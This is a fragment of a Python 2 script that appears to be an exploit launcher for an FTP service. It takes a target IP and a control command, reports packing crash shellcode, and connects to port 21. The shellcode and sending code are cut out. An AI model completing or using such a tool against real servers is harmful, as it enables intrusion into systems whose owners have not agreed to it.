...
import optparse;
import socket;
parser = optparse.OptionParser('Usage:python Script.py -t <TargetIp> -Cmd <Command>');
parser.add_option("-t",'--Target',dest='TargetIP',type="string",help='[?]这个参数需要一个目标IP（Need a target ip） ');
parser.add_option('-C','--Command',dest='Command',type='string',help='[?]需要一个控制指令 (Need a Command )');
(options,args)=parser.parse_args();
if(options.TargetIP == None or options.Command == None):
	print '[+]Are you need help?input "python Script.py -h " if you need !';
	exit(0);
...
print '[+]Pack shellcode (crash) ok ';
print '[!]Create socket for ftp ,now';
SOCK = socket.socket();

try:
	SOCK.connect((TargetIP,21));
except:
	print '[-]Connect error!';
	exit(0);
